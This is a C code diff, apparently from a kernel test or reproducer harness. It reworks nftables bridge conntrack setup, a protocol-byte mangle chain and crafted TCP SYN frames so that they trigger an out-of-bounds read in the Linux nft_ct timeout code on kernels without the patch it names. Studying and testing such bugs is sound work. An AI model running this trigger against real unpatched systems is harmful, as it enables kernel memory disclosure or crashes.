@@ -150,6 +150,9 @@
 /* CTA_TIMEOUT_TCP_* state attrs nested under NFTA_CT_TIMEOUT_DATA */
 #define BRCT_CTA_TIMEOUT_TCP_SYN_SENT		1
 #define BRCT_CTA_TIMEOUT_TCP_ESTABLISHED	3
+/* CTA_TIMEOUT_UDP_* state attrs nested under NFTA_CT_TIMEOUT_DATA */
+#define BRCT_CTA_TIMEOUT_UDP_UNREPLIED		1
+#define BRCT_CTA_TIMEOUT_UDP_REPLIED		2
 /* nft_objref IMM-mode attrs nested under NFTA_EXPR_DATA */
 #define BRCT_NFTA_OBJREF_IMM_TYPE	1
 #define BRCT_NFTA_OBJREF_IMM_NAME	2
@@ -159,6 +162,7 @@
  * chain (-100).  The mangle rule rewrites pkt->tprot in this window. */
 #define BRCT_NF_BR_PRI_MANGLE		(NF_BR_PRI_CT_PRE + 50)
 #define BRCT_IPPROTO_TCP		6
+#define BRCT_IPPROTO_UDP		17
 /* IPv4 protocol field: byte 9 of the network (IP) header. */
 #define BRCT_IPV4_PROTO_OFFSET		9
 
@@ -501,20 +505,21 @@ static int nft_install_bridge_ct(struct nfnl_ctx *nf, const char *table,
 
 /*
  * Install an intermediate-priority base chain "br_mangle" that rewrites
- * the IPv4 protocol byte (network-header offset 9) from IPPROTO_UDP to
- * IPPROTO_TCP via nft_payload SET, using an nft_immediate expression to
- * load the TCP value into NFT_REG32_00 first.
+ * the IPv4 protocol byte (network-header offset 9) from IPPROTO_TCP to
+ * IPPROTO_UDP via nft_payload SET, using an nft_immediate expression to
+ * load the UDP value (17) into NFT_REG32_00 first.
  *
  * Hook priority BRCT_NF_BR_PRI_MANGLE (-150) puts this chain AFTER the
- * bridge conntrack PRE hook (-200, which records nf_ct_protonum(ct)=UDP)
+ * bridge conntrack PRE hook (-200, which records nf_ct_protonum(ct)=TCP)
  * and BEFORE the ct-timeout eval chain (-100).  When the packet reaches
  * the ct-timeout chain, the kernel re-reads the IP protocol field and
- * sets pkt->tprot = IPPROTO_TCP.  The TCP timeout object (priv->l4proto
- * = TCP) then passes the old guard `priv->l4proto != pkt->tprot` but
- * fails the new guard `priv->l4proto != nf_ct_protonum(ct)` added by
- * Kyle Zeng's 2026-08-10 patch.  Without the fix the code proceeds to
- * index the TCP state array with a UDP conntrack entry, producing the
- * targeted OOB read.
+ * sets pkt->tprot = IPPROTO_UDP.  The UDP timeout object (priv->l4proto
+ * = UDP) then passes the guard `priv->l4proto != pkt->tprot` (both UDP)
+ * and also passes the new guard `priv->l4proto != nf_ct_protonum(ct)`
+ * added by Kyle Zeng's 2026-08-10 patch because ct is TCP.  Without
+ * the fix the code proceeds to index the 8-byte UDP state array with a
+ * TCP conntrack entry: timeouts[TCP_CONNTRACK_UNACK] = index 13, which
+ * is 48 bytes past the end of the 8-byte array, producing the OOB read.
  *
  * Caller must have already committed the br_ct NEWTABLE batch.
  * Returns 0 on batch acceptance; non-zero is a soft failure (the
@@ -529,11 +534,13 @@ static int nft_install_ct_mangle(struct nfnl_ctx *nf, const char *table,
 	size_t elem_off, expr_data_off, imm_data_off;
 	__u8 family = NFPROTO_BRIDGE;
 	__u32 prio = (__u32)(int)(BRCT_NF_BR_PRI_MANGLE);
-	/* Four-byte immediate value: byte 0 = IPPROTO_TCP (6), rest zero.
+	/* Four-byte immediate value: byte 0 = IPPROTO_UDP (17), rest zero.
 	 * nft_payload_set_eval copies priv->len (1) bytes from the start
-	 * of the register, so byte 0 must hold the protocol constant. */
+	 * of the register, so byte 0 must hold the protocol constant.
+	 * The mangle rewrites the TCP frame's protocol field to UDP so
+	 * pkt->tprot matches the UDP timeout object at hook -100. */
 	static const unsigned char tcp_proto_val[4] = {
-		BRCT_IPPROTO_TCP, 0, 0, 0
+		BRCT_IPPROTO_UDP, 0, 0, 0
 	};
 
 	memset(buf, 0, sizeof(buf));
@@ -544,8 +551,8 @@ static int nft_install_ct_mangle(struct nfnl_ctx *nf, const char *table,
 		return -EIO;
 
 	/* NEWCHAIN "br_mangle" at NF_BR_PRE_ROUTING priority -150.
-	 * Fires after conntrack marks the packet UDP, before ct-timeout
-	 * chain evaluates the TCP timeout object. */
+	 * Fires after conntrack marks the packet TCP, before ct-timeout
+	 * chain evaluates the UDP timeout object. */
 	{
 		msg_off = off;
 		off = nfnl_msg_put(buf, off, sizeof(buf), nl_seq_next(&nf->nl),
@@ -583,7 +590,7 @@ static int nft_install_ct_mangle(struct nfnl_ctx *nf, const char *table,
 			(__u32)(off - msg_off);
 	}
 
-	/* NEWRULE: two expressions -- immediate (IPPROTO_TCP -> reg0)
+	/* NEWRULE: two expressions -- immediate (IPPROTO_UDP -> reg0)
 	 * then payload SET (reg0[0] -> network-header[9], len=1). */
 	{
 		msg_off = off;
@@ -606,7 +613,7 @@ static int nft_install_ct_mangle(struct nfnl_ctx *nf, const char *table,
 		if (!off)
 			return -EIO;
 
-		/* expr[0]: immediate -- dreg=NFT_REG32_00, value=6 */
+		/* expr[0]: immediate -- dreg=NFT_REG32_00, value=17 */
 		elem_off = off;
 		off = nla_nest_start(buf, off, sizeof(buf),
 				     BRCT_NFTA_LIST_ELEM | NLA_F_NESTED);
@@ -697,7 +704,7 @@ static int nft_install_ct_mangle(struct nfnl_ctx *nf, const char *table,
 }
 
 /*
- * Install a CT_TIMEOUT named object (for TCP) in the pre-existing
+ * Install a CT_TIMEOUT named object (for UDP) in the pre-existing
  * br_ct table, then attach it to a hooked chain that runs after the
  * bridge conntrack PRE hook (priority NF_BR_PRI_CT_PRE + 100 = -100).
  * The objref IMM expression makes nft_ct_timeout_obj_eval() run on
@@ -705,12 +712,17 @@ static int nft_install_ct_mangle(struct nfnl_ctx *nf, const char *table,
  *
  * This exercises the code path targeted by Kyle Zeng's 2026-08-10 patch
  * (nft_ct: validate timeout object protocol against ct entry's l4proto).
- * The mismatch that triggers the OOB read requires a payload set to
- * rewrite pkt->tprot between conntrack and this chain; that arm is
- * tracked separately.  Without the mangle, the early
- * `priv->l4proto != pkt->tprot' guard will short-circuit for UDP
- * traffic, but the NEWOBJ + NEWCHAIN + NEWRULE install path is still
- * exercised end-to-end each invocation.
+ * OOB direction: frames are sent as TCP (frame[23]=0x06) so the bridge
+ * conntrack PRE hook (-200) creates a TCP conntrack entry.  The mangle
+ * chain (-150) rewrites the IP protocol byte to UDP so pkt->tprot=UDP
+ * when the ct-timeout chain (-100) runs.  The UDP timeout object
+ * (priv->l4proto=UDP, 8-byte state array) passes the
+ * `priv->l4proto != pkt->tprot' guard (both UDP) and reaches the
+ * timeouts[] array indexing.  The TCP conntrack entry then drives
+ * nf_ct_protonum(ct)=TCP, causing the engine to walk TCP state indices
+ * (e.g. TCP_CONNTRACK_UNACK=13) into the 8-byte UDP array -- 48 bytes
+ * out of bounds.  The inverse direction (TCP timeout + UDP conntrack)
+ * is harmless: UDP indices 0 and 1 lie within the 56-byte TCP array.
  *
  * Returns 0 when the batch is accepted; the caller treats non-zero
  * as a soft failure (the conntrack-flush burst runs regardless).
@@ -724,7 +736,7 @@ static int nft_install_ct_timeout(struct nfnl_ctx *nf, const char *table,
 	size_t hook_off, exprs_off, elem_off, expr_data_off;
 	__u8 family = NFPROTO_BRIDGE;
 	__u32 prio = (__u32)(int)(BRCT_NF_BR_PRI_AFTER_CT_PRE);
-	__u8 l4proto = BRCT_IPPROTO_TCP;
+	__u8 l4proto = BRCT_IPPROTO_UDP;
 
 	memset(buf, 0, sizeof(buf));
 
@@ -733,10 +745,10 @@ static int nft_install_ct_timeout(struct nfnl_ctx *nf, const char *table,
 	if (!off)
 		return -EIO;
 
-	/* NFT_MSG_NEWOBJ: CT_TIMEOUT for TCP.
-	 * L4PROTO=IPPROTO_TCP lets nft_ct_timeout_obj_eval() reach the
-	 * per-proto state-array access; NFTA_CT_TIMEOUT_DATA carries two
-	 * representative TCP state timeouts (seconds, big-endian u32). */
+	/* NFT_MSG_NEWOBJ: CT_TIMEOUT for UDP.
+	 * L4PROTO=IPPROTO_UDP gives an 8-byte state array; combined with a
+	 * TCP conntrack entry this is the OOB path.  NFTA_CT_TIMEOUT_DATA
+	 * carries the two UDP state timeouts (seconds, big-endian u32). */
 	{
 		msg_off = off;
 		off = nfnl_msg_put(buf, off, sizeof(buf), nl_seq_next(&nf->nl),
@@ -771,11 +783,11 @@ static int nft_install_ct_timeout(struct nfnl_ctx *nf, const char *table,
 		if (!off)
 			return -EIO;
 		off = nla_put_be32(buf, off, sizeof(buf),
-				   BRCT_CTA_TIMEOUT_TCP_SYN_SENT, 120);
+				   BRCT_CTA_TIMEOUT_UDP_UNREPLIED, 30);
 		if (!off)
 			return -EIO;
 		off = nla_put_be32(buf, off, sizeof(buf),
-				   BRCT_CTA_TIMEOUT_TCP_ESTABLISHED, 432000);
+				   BRCT_CTA_TIMEOUT_UDP_REPLIED, 180);
 		if (!off)
 			return -EIO;
 		nla_nest_end(buf, l4_data_off, off);
@@ -997,12 +1009,13 @@ static void *brct_packet_sender(void *arg)
 		memcpy(frame +  6, src_mac, 6);
 		frame[12] = 0x08;	/* ETH_P_IP */
 		frame[13] = 0x00;
-		/* Minimal IPv4+UDP header so the bridge ct hook sees a
-		 * parseable L4 tuple to insert into the conntrack table. */
+		/* Minimal IPv4+TCP header so the bridge ct hook creates a
+		 * TCP conntrack entry; the mangle chain rewrites proto to
+		 * UDP before the ct-timeout chain runs. */
 		frame[14] = 0x45;	/* IPv4, ihl=5 */
 		frame[16] = 0x00; frame[17] = 0x2c;	/* tot_len = 44 */
 		frame[22] = 0x40;	/* ttl */
-		frame[23] = 0x11;	/* IPPROTO_UDP */
+		frame[23] = 0x06;	/* IPPROTO_TCP */
 		frame[26] = 10; frame[27] = 0;
 		/* source address rotates every 4 iters so each flow sees >=2 packets;
 		 * required for ct-timeout probes that need the L4 handler invoked post-attach */
@@ -1011,7 +1024,9 @@ static void *brct_packet_sender(void *arg)
 		frame[32] = 0; frame[33] = 1;
 		frame[34] = 0x30; frame[35] = 0x39;	/* sport 12345 */
 		frame[36] = 0x30; frame[37] = 0x3a;	/* dport 12346 */
-		frame[38] = 0x00; frame[39] = 0x10;	/* len = 16 */
+		/* TCP seq/ack (frames[38..45]) stay zero from memset. */
+		frame[46] = 0x50;			/* TCP data offset = 5 (20 bytes) */
+		frame[47] = 0x02;			/* TCP flags: SYN */
 
 		memset(&sll, 0, sizeof(sll));
 		sll.sll_family   = AF_PACKET;
